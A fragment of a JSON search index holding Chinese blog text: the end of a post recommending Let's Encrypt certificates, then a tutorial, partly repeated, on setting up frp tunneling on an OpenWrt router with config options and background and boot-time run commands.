\u65e5\u5f00\u59cb\u652f\u6301\u7b7e\u53d1 ECC \u8bc1\u4e66\u3002 Let's Encrypt \u5b98\u65b9\u7684\u65b0\u7279\u6027\u9884\u544a\u53ef\u4ee5\u5728 \u8fd9\u4e2a\u9875\u9762\u67e5\u770b \u3002 \u6211\u4e2a\u4eba\u5efa\u8bae\uff1a\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u5982\u679c\u975e\u5e38\u5728\u610f\u8bc1\u4e66\u517c\u5bb9\u6027\uff0c\u53ef\u4ee5\u8d2d\u4e70 RapidSSL Standard \u6216\u8005 Comodo Positive SSL \u8fd9\u4e24\u79cd\u8bc1\u4e66\u3002\u5176\u4e2d RapidSSL \u8bc1\u4e66\u4e00\u5171\u624d\u4e09\u7ea7\uff0c\u6bd4\u8f83\u5c0f\uff1bComodo Positive \u6709\u56db\u7ea7\uff0c\u4f46\u53ef\u4ee5\u7533\u8bf7 ECC \u8bc1\u4e66\uff1b\u4e8c\u8005\u90fd\u6709\u7740\u4e0d\u9519\u7684\u517c\u5bb9\u6027\uff0c\u4e5f\u975e\u5e38\u5ec9\u4ef7\uff08\u4e00\u5e74\u4e0d\u5230 10$\uff09\u3002\u5f53\u7136\uff0c\u5982\u679c\u4e0d\u7528\u8003\u8651 Windows XP \u7528\u6237\uff0c\u90a3\u4e48\u5f3a\u70c8\u63a8\u8350 Let's Encrypt\uff01 \u66f4\u65b0\uff1aLet's Encrypt \u5df2\u7ecf\u652f\u6301 Windows XP \u548c\u7b7e\u53d1 ECC \u8bc1\u4e66\uff0c\u5bf9\u4e8e\u4e2a\u4eba\u7528\u6237\u6765\u8bf4\uff0c\u76ee\u524d Let's Encrypt \u65e0\u7591\u662f\u6700\u597d\u7684\u9009\u62e9\u3002 \u672c\u6587\u5148\u5199\u5230\u8fd9\u91cc\uff0c\u5982\u679c\u4f60\u5728\u7533\u8bf7 Let's Encrypt \u8bc1\u4e66\u7684\u8fc7\u7a0b\u4e2d\u9047\u5230\u95ee\u9898\uff0c\u53ef\u4ee5\u7ed9\u6211\u7559\u8a00\uff0c\u4e5f\u6b22\u8fce\u4ea4\u6d41\u5404\u79cd\u5fc3\u5f97\uff01 \u672c\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html \uff0c \u53c2\u4e0e\u8bc4\u8bba \u00bb --EOF-- \u539f\u6587\u94fe\u63a5\uff1a https://imququ.com/post/letsencrypt-certificate.html","title":"\u51e0\u4e2a\u95ee\u9898"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/","text":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba \u6700\u540e\u66f4\u65b0\u65f6\u95f4\uff1a2018\u5e7411\u670817\u65e5 \u6709\u65f6\u6211\u4eec\u9700\u8981\u4e3a\u4e86\u65b9\u4fbf\uff0c\u8fdc\u7a0b\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u53ef\u80fd\u5e76\u6ca1\u6709\u90a3\u4e48\u5bb9\u6613\u3002 \u5982\u679c\u4f60\u6709\u516c\u7f51 IP \u7684\u8bdd\uff0c\u6253\u5f00\u67d0\u4e9b\u7aef\u53e3\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46 IPv4 \u5730\u5740\u5c31\u90a3\u4e48\u70b9\uff0c\u4e0d\u591f\u7ed9\u6bcf\u4e2a\u4eba\u6216\u6bcf\u53f0\u8bbe\u5907\u5206\u914d\uff0cIPv6 \u8fd8\u6ca1\u5b8c\u5168\u666e\u53ca\u3002\u8fd9\u65f6\u5019\u9700\u8981\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a\u5185\u7f51\u7a7f\u900f\u3002 \u4ec0\u4e48\u662f\u5185\u7f51\u7a7f\u900f\uff1f\u7b80\u5355\u6765\u8bb2\u5c31\u662f\uff1a\u5185\u7f51\u8bbe\u5907\u548c\u516c\u7f51\u8bbe\u5907\u4e4b\u95f4\u4fdd\u6301\u4e00\u4e2a\u6301\u4e45\u8fde\u63a5\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u516c\u7f51\u8bbe\u5907\u65f6\uff0c\u516c\u7f51\u8bbe\u5907\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u5185\u7f51\u8bbe\u5907\uff0c\u7531\u5185\u7f51\u8bbe\u5907\u5904\u7406\u8bf7\u6c42\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u516c\u7f51\u8bbe\u5907\u63a5\u7740\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907\u3002 \u5185\u7f51\u7a7f\u900f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f51\u7a7f\u900f\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u6bd4\u5982\uff1aNgrok \u548c frp\u3002 Ngrok \u642d\u5efa\u6bd4\u8f83\u590d\u6742\uff0c\u9700\u8981\u4ece Google \u4e0b\u8f7d\u6587\u4ef6\uff0c\u5bf9\u56fd\u5185 VPS \u4e0d\u592a\u53cb\u597d\u3002 frp \u5c31\u597d\u591a\u4e86\uff0c\u914d\u7f6e\u7b80\u5355\uff0c\u652f\u6301\u591a\u79cd\u534f\u8bae\uff0c\u8fd9\u6b21\u6211\u4eec\u5c31\u7528 frp \u6765\u642d\u5efa\u4e00\u4e2a\u5185\u7f51\u7a7f\u900f\u3002 \u51c6\u5907\u5de5\u4f5c \u4e00\u53f0\u516c\u7f51\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u670d\u52a1\u5668\u3001VPS \u6216\u8005 \u5176\u4ed6\u6709\u516c\u7f51 IP \u7684\u8bbe\u5907\u3002 \u8def\u7531\u5668\u53ef\u7528\u7a7a\u95f4\u9700\u5927\u4e8e 5M \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u8fdb\u5165 https://github.com/fatedier/frp/releases/latest \u4e0b\u8f7d\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u5bf9\u5e94\u7684\u7248\u672c \u516c\u7f51\u8bbe\u5907\u5982\u679c\u662f\u670d\u52a1\u5668\u6216\u8005 VPS\uff0c\u7cfb\u7edf\u662f Windows \u4e0b\u8f7d Windows \u7248\u672c\uff0cLinux \u4e0b\u8f7d Linux \u7248\u672c\uff0c\u7136\u540e\u6839\u636e\u7cfb\u7edf\u4f4d\u6570\u518d\u9009\u62e9 i386 \u6216 amd64\u3002 \u8def\u7531\u5668\u6839\u636e CPU \u67b6\u6784\u4e0b\u8f7d\u5bf9\u5e94\u7684 Linux \u7248\u672c\uff0c\u8fd9\u4e2a\u6211\u8bf4\u8fc7\u5f88\u591a\u6b21\u4e86\u3002 \u538b\u7f29\u5305\u4f1a\u6709\u4e24\u4e2a\u53ef\u6267\u884c\u6587\u4ef6 frps \u548c frpc\uff0cs \u662f\u670d\u52a1\u7aef\uff0cc \u662f\u5ba2\u6237\u7aef\u3002\u670d\u52a1\u7aef\u4e0a\u4f20\u5230\u516c\u7f51\u8bbe\u5907\uff0c\u5ba2\u6237\u7aef\u4e0a\u4f20\u5230\u8def\u7531\u5668\uff0c\u914d\u7f6e\u6587\u4ef6\u4e5f\u9700\u8981\u4e0a\u4f20\uff0cfrps.ini \u548c frpc.ini\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5b58\u653e frp \u7684\u76ee\u5f55\uff1a mkdir /usr/local/frp \u7136\u540e\u5c06 frp \u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u4f20\u5230 /usr/local/frp \uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4e0a\u4f20\u5230\u522b\u7684\u4f4d\u7f6e\u3002 \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u6743\u9650\uff1a chmod +x /usr/local/frp/frp* \u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8f6f\u8fde\u63a5\uff1a ln -s /usr/local/frp/frps /usr/bin/frps \u6216 ln -s /usr/local/frp/frpc /usr/bin/frpc \u4e0b\u9762\u914d\u7f6e\u4ee5\u5355\u4eba\u4f7f\u7528\u4e3a\u4f8b\uff0c\u5982\u679c\u9700\u8981\u914d\u7f6e\u591a\u4eba\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u8fdb\u884c\u4fee\u6539\u3002 \u914d\u7f6e\u670d\u52a1\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrps.ini bind_port = 7000 \u662f frps \u7684\u7aef\u53e3\uff0c\u53ef\u4ee5\u6539\uff0c\u4e5f\u53ef\u4ee5\u7528\u9ed8\u8ba4\u7684\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u9879\uff1a token \uff0c\u8fd9\u4e2a\u7528\u6765\u505a\u8eab\u4efd\u9a8c\u8bc1\uff0c\u63a8\u8350\u5f00\u542f\u3002\u53ea\u6709 frps \u548c frpc \u4e00\u81f4\u624d\u53ef\u4ee5\u5efa\u7acb\u8fde\u63a5\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u4e4b\u95f4\u65f6\u95f4\u5dee\u4e0d\u80fd\u8d85\u8fc7 15 \u5206\u949f\uff0c\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0 authentication_timeout \u914d\u7f6e\u9879\u6765\u66f4\u6539\u8fd9\u4e2a\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u79d2\uff0c\u9ed8\u8ba4\u4e3a 900\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u56fd\u5916 VPS \u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u4e00\u70b9\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frps.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002 \u6dfb\u52a0 vhost_http_port \u548c vhost_https_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u5ba2\u6237\u7aef\u7684\u8f6c\u53d1\u534f\u8bae\u4e3a HTTP \u6216 HTTPS \u65f6\u7684\u8bbf\u95ee\u7aef\u53e3\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.ini \u914d\u7f6e\u5ba2\u6237\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrpc.ini server_addr \u548c server_port \u662f frps \u7684 IP \u548c\u7aef\u53e3\u3002 \u4e0b\u9762\u9ed8\u8ba4\u6709\u4e00\u4e2a SSH \u914d\u7f6e\uff0c\u628a\u5b83\u5220\u4e86\u3002 \u5982\u679c\u4f60\u5728 frps \u8bbe\u7f6e\u4e86 token \uff0c\u90a3 frpc \u4e5f\u9700\u8981\u540c\u6837\u7684\u914d\u7f6e\u9879\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frpc.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u5c06\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\u4fe1\u606f\u3002 \u53ef\u4ee5\u6dfb\u52a0 login_fail_exit \u914d\u7f6e\u9879\u51b3\u5b9a\u662f\u5426\u8ba9 fprc \u8fde\u63a5 frps \u5931\u8d25\u540e\u9000\u51fa\u7a0b\u5e8f\uff0c\u63a8\u8350\u8bbe\u7f6e\u4e3a false \uff0c\u9632\u6b62\u5f02\u5e38\u9000\u51fa\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u8282\u70b9\uff1a [web] \u6dfb\u52a0 type \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8f6c\u53d1\u534f\u8bae\uff0c\u652f\u6301\uff1ahttp\u3001https\u3001tcp\u3001udp \u7b49\uff0c\u8f6c\u53d1 Web \u4f7f\u7528 HTTP(S)\uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 TCP\u3002 \u6dfb\u52a0 local_ip \u548c local_port \u8bbe\u7f6e\u672c\u5730 IP \u548c\u7aef\u53e3\uff0cIP \u8bbe\u7f6e\u4e3a 127.0.0.1\uff0c\u7aef\u53e3\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8f6c\u53d1\u7684\u7aef\u53e3\u5373\u53ef\uff0cWeb \u4e00\u822c\u4e3a 80 \u548c 443 (HTTPS) \u53ef\u4ee5\u6dfb\u52a0 custom_domains \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u5982\u679c\u914d\u7f6e\u4e86\u591a\u4e2a Web \u670d\u52a1\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u57df\u540d\u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u6dfb\u52a0 use_encryption = true \u548c use_compression = true \u52a0\u5bc6\u548c\u538b\u7f29\u6570\u636e\uff0c\u4f46\u4f1a\u6d88\u8017\u989d\u5916\u7684 CPU \u8d44\u6e90\u3002 \u53ef\u4ee5\u6dfb\u52a0 http_user \u548c http_pwd \u6765\u4fdd\u62a4 Web \u670d\u52a1\uff0c\u4ec5\u652f\u6301 HTTP\u3002 \u5982\u679c\u4f60\u9700\u8981\u8f6c\u53d1 TCP \u548c UDP\uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u8282\u70b9\u91cc\u6dfb\u52a0 remote_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8fdc\u7a0b\u7aef\u53e3\u5373\u53ef\u3002\u6bd4\u5982\u8f6c\u53d1 SSH\uff0c remote_port \u8bbe\u7f6e\u4e3a 222\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u8bbf\u95ee ssh://\u8fdc\u7a0bIP:222 \u5c31\u53ef\u4ee5\u4e86\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frpc.ini \u4f60\u53ef\u4ee5\u76f4\u63a5\u5728\u6211\u7684\u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\u57fa\u7840\u4e0a\u8fdb\u884c\u4fee\u6539\u3002 \u66f4\u591a\u914d\u7f6e\u53c2\u6570\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5b8c\u6210\u540e\uff0c\u540c\u6837\u4e0a\u4f20\u5230\u4f60\u7684\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u7684 frp \u76ee\u5f55\u3002 \u4e00\u5207\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u5148\u5728\u524d\u7aef\u8fd0\u884c\u6d4b\u8bd5\u4e00\u4e0b\u3002 \u670d\u52a1\u7aef\uff1a frps -c /usr/local/frp/frps.ini \u5ba2\u6237\u7aef\uff1a frpc -c /usr/local/frp/frpc.ini \u5982\u679c\u63d0\u793a\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u8bf7\u68c0\u67e5\u4f60\u7684\u8f6f\u8fde\u63a5\u662f\u5426\u521b\u5efa\u6709\u8bef\u3002 \u52a1\u5fc5\u5148\u8fd0\u884c\u670d\u52a1\u7aef\u518d\u8fd0\u884c\u5ba2\u6237\u7aef\uff0c\u5426\u5219\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u9000\u51fa\u3002 \u8fd0\u884c\u6210\u529f\u540e\u8bbf\u95ee\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u6ca1\u95ee\u9898\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u653e\u5728\u540e\u53f0\u8fd0\u884c\u4e86\u3002 \u540e\u53f0\u8fd0\u884c \u7b2c\u4e00\u79cd\uff1a \u8fd0\u884c\uff1a frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 & \u7ed3\u675f\uff1a killall frpc \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 &' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && frpc -c \\/usr\\/local\\/frp\\/frpc.ini >\\/dev\\/null 2>&1 &/d' /etc/rc.local \u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u540e\u53f0\u8fd0\u884c frp\uff0c\u597d\u50cf\u7279\u522b\u5bb9\u6613\u6302\u6389\u3002 \u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u63a8\u8350\u5f00\u542f\u65e5\u5fd7\u4fdd\u5b58 \u7b2c\u4e8c\u79cd\uff1a\u4f7f\u7528 screen \u8def\u7531\u5668\u5b89\u88c5\u547d\u4ee4\uff1a opkg update && opkg install screen \uff0c\u670d\u52a1\u5668\u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install screen -y \u6216 sudo yum install screen -y \u3002 screen \u7684\u8be6\u7ec6\u7528\u6cd5\u5927\u5bb6\u53ef\u4ee5\u53bb\u767e\u5ea6\u4e00\u4e0b\uff0c\u6211\u8fd9\u91cc\u53ea\u8bf4\u600e\u4e48\u7528\u5b83\u6765\u540e\u53f0\u8fd0\u884c frp\u3002 \u8fd0\u884c\uff1a screen -dmS frpc frpc -c /usr/local/frp/frpc.ini \u67e5\u770b\u8fd0\u884c\u72b6\u6001\uff1a screen -r frpc \u67e5\u770b\u8fd0\u884c\u72b6\u6001\u540e\uff0c\u6309 Ctrl + C \u7ed3\u675f frpc\uff0c\u6309 Ctrl + A + D (A \u548c D \u4f9d\u6b21\u6309\u4e0b) \u4e3a\u6682\u65f6\u9000\u51fa\uff0c\u4f9d\u7136\u4fdd\u6301\u540e\u53f0\u8fd0\u884c\u3002 \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && screen -dmS frpc frpc -c /usr/local/frp/frpc.ini' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && screen -dmS frpc frpc -c \\/usr\\/local\\/frp\\/frpc.ini/d' /etc/rc.local \u5f00\u673a\u5ef6\u8fdf 10 \u79d2\u8fd0\u884c\u662f\u786e\u4fdd\u8def\u7531\u5668\u8054\u7f51\uff0c\u907f\u514d frpc \u81ea\u52a8\u9000\u51fa\u3002 \u7b2c\u4e09\u79cd\uff08\u4ec5\u9002\u7528\u4e8e\u6709 systemd \u7684 Linux \u53d1\u884c\u7248\uff09\uff1a \u4e0b\u8f7d\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5bf9\u5e94\u7684 systemd \u670d\u52a1\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u8def\u5f84\u662f\u9ed8\u8ba4\u7684 /usr/local/frp/ \uff0c\u5982\u679c\u4f60\u7684\u8def\u5f84\u4e0d\u662f\u8fd9\u4e2a\uff0c\u6ce8\u610f\u66f4\u6539\u3002 \u670d\u52a1\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5ba2\u6237\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5f00\u673a\u542f\u52a8 frp\uff1a systemctl enable frpc.service \u6216 systemctl enable frps.service \u542f\u52a8 frp\uff1a systemctl start frpc.service \u6216 systemctl start frps.service \u505c\u6b62 frp\uff1a systemctl stop frpc.service \u6216 systemctl stop frps.service \u91cd\u542f frp\uff1a systemctl restart frpc.service \u6216 systemctl restart frps.service \u67e5\u770b systemd \u670d\u52a1\u72b6\u6001\uff1a systemctl status frpc.service \u6216 systemctl status frps.service \u5982\u679c\u63d0\u793a running \u5219\u8868\u793a\u8fd0\u884c\u6b63\u5e38 \u5982\u679c\u4f60\u60f3\u8fdc\u7a0b\u7535\u8111\uff0c\u53ef\u4ee5\u5728\u7535\u8111\u4e0a\u5b89\u88c5 TeamViewer \uff0c\u7136\u540e\u5f00\u542f\u4e3b\u677f BIOS \u91cc\u7684 PCI \u8bbe\u5907\u5524\u9192\uff0c\u8def\u7531\u5668\u5b89\u88c5 WOL \u7f51\u7edc\u5524\u9192\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u5f00\u673a\uff0c\u5e76\u4e14\u4f7f\u7528 TeamViewer \u63a7\u5236\u7535\u8111\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u8f6c\u53d1\u5185\u7f51\u5185\u5176\u4ed6\u8bbe\u5907\u7684\u670d\u52a1\uff0c\u5c06 frpc \u7684 local_ip \u914d\u7f6e\u9879\u6539\u4e3a\u5185\u7f51\u5176\u4ed6\u8bbe\u5907\u7684 IP \u5373\u53ef\u3002 GitHub: https://github.com/fatedier/frp \u5fae\u4fe1\u626b\u63cf\u4e8c\u7ef4\u7801\u5173\u6ce8\u6211\u4eec \u5982\u679c\u89c9\u5f97\u6587\u7ae0\u6709\u5e2e\u52a9\u5230\u4f60\uff0c\u53ef\u4ee5\u70b9\u51fb\u4e0b\u65b9\u7684\u6253\u8d4f\u6309\u94ae\u8d5e\u52a9\u4e0b\u670d\u52a1\u5668\u8d39\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.mivm.cn/openwrt-frp/","title":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#openwrt-frp","text":"\u6700\u540e\u66f4\u65b0\u65f6\u95f4\uff1a2018\u5e7411\u670817\u65e5 \u6709\u65f6\u6211\u4eec\u9700\u8981\u4e3a\u4e86\u65b9\u4fbf\uff0c\u8fdc\u7a0b\u8bbf\u95ee\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u8fdc\u7a0b\u8bbf\u95ee\u53ef\u80fd\u5e76\u6ca1\u6709\u90a3\u4e48\u5bb9\u6613\u3002 \u5982\u679c\u4f60\u6709\u516c\u7f51 IP \u7684\u8bdd\uff0c\u6253\u5f00\u67d0\u4e9b\u7aef\u53e3\u5c31\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46 IPv4 \u5730\u5740\u5c31\u90a3\u4e48\u70b9\uff0c\u4e0d\u591f\u7ed9\u6bcf\u4e2a\u4eba\u6216\u6bcf\u53f0\u8bbe\u5907\u5206\u914d\uff0cIPv6 \u8fd8\u6ca1\u5b8c\u5168\u666e\u53ca\u3002\u8fd9\u65f6\u5019\u9700\u8981\u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a\u5185\u7f51\u7a7f\u900f\u3002 \u4ec0\u4e48\u662f\u5185\u7f51\u7a7f\u900f\uff1f\u7b80\u5355\u6765\u8bb2\u5c31\u662f\uff1a\u5185\u7f51\u8bbe\u5907\u548c\u516c\u7f51\u8bbe\u5907\u4e4b\u95f4\u4fdd\u6301\u4e00\u4e2a\u6301\u4e45\u8fde\u63a5\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u516c\u7f51\u8bbe\u5907\u65f6\uff0c\u516c\u7f51\u8bbe\u5907\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u5185\u7f51\u8bbe\u5907\uff0c\u7531\u5185\u7f51\u8bbe\u5907\u5904\u7406\u8bf7\u6c42\u518d\u628a\u6570\u636e\u8fd4\u56de\u7ed9\u516c\u7f51\u8bbe\u5907\u63a5\u7740\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4ece\u800c\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u5185\u7f51\u8bbe\u5907\u3002 \u5185\u7f51\u7a7f\u900f\u53ef\u4ee5\u4f7f\u7528\u5185\u7f51\u7a7f\u900f\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u6bd4\u5982\uff1aNgrok \u548c frp\u3002 Ngrok \u642d\u5efa\u6bd4\u8f83\u590d\u6742\uff0c\u9700\u8981\u4ece Google \u4e0b\u8f7d\u6587\u4ef6\uff0c\u5bf9\u56fd\u5185 VPS \u4e0d\u592a\u53cb\u597d\u3002 frp \u5c31\u597d\u591a\u4e86\uff0c\u914d\u7f6e\u7b80\u5355\uff0c\u652f\u6301\u591a\u79cd\u534f\u8bae\uff0c\u8fd9\u6b21\u6211\u4eec\u5c31\u7528 frp \u6765\u642d\u5efa\u4e00\u4e2a\u5185\u7f51\u7a7f\u900f\u3002","title":"OpenWrt \u4f7f\u7528 frp \u5b9e\u73b0\u5185\u7f51\u7a7f\u900f \u51c6\u5907\u5de5\u4f5c \u642d\u5efa\u5185\u7f51\u7a7f\u900f \u6587\u7ae0\u8bc4\u8bba"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#_1","text":"\u4e00\u53f0\u516c\u7f51\u8bbe\u5907\uff0c\u6bd4\u5982\uff1a\u670d\u52a1\u5668\u3001VPS \u6216\u8005 \u5176\u4ed6\u6709\u516c\u7f51 IP \u7684\u8bbe\u5907\u3002 \u8def\u7531\u5668\u53ef\u7528\u7a7a\u95f4\u9700\u5927\u4e8e 5M","title":"\u51c6\u5907\u5de5\u4f5c"},{"location":"RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/#_2","text":"\u8fdb\u5165 https://github.com/fatedier/frp/releases/latest \u4e0b\u8f7d\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u5bf9\u5e94\u7684\u7248\u672c \u516c\u7f51\u8bbe\u5907\u5982\u679c\u662f\u670d\u52a1\u5668\u6216\u8005 VPS\uff0c\u7cfb\u7edf\u662f Windows \u4e0b\u8f7d Windows \u7248\u672c\uff0cLinux \u4e0b\u8f7d Linux \u7248\u672c\uff0c\u7136\u540e\u6839\u636e\u7cfb\u7edf\u4f4d\u6570\u518d\u9009\u62e9 i386 \u6216 amd64\u3002 \u8def\u7531\u5668\u6839\u636e CPU \u67b6\u6784\u4e0b\u8f7d\u5bf9\u5e94\u7684 Linux \u7248\u672c\uff0c\u8fd9\u4e2a\u6211\u8bf4\u8fc7\u5f88\u591a\u6b21\u4e86\u3002 \u538b\u7f29\u5305\u4f1a\u6709\u4e24\u4e2a\u53ef\u6267\u884c\u6587\u4ef6 frps \u548c frpc\uff0cs \u662f\u670d\u52a1\u7aef\uff0cc \u662f\u5ba2\u6237\u7aef\u3002\u670d\u52a1\u7aef\u4e0a\u4f20\u5230\u516c\u7f51\u8bbe\u5907\uff0c\u5ba2\u6237\u7aef\u4e0a\u4f20\u5230\u8def\u7531\u5668\uff0c\u914d\u7f6e\u6587\u4ef6\u4e5f\u9700\u8981\u4e0a\u4f20\uff0cfrps.ini \u548c frpc.ini\u3002 \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5b58\u653e frp \u7684\u76ee\u5f55\uff1a mkdir /usr/local/frp \u7136\u540e\u5c06 frp \u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u4f20\u5230 /usr/local/frp \uff0c\u5f53\u7136\uff0c\u4f60\u53ef\u4ee5\u4e0a\u4f20\u5230\u522b\u7684\u4f4d\u7f6e\u3002 \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u6743\u9650\uff1a chmod +x /usr/local/frp/frp* 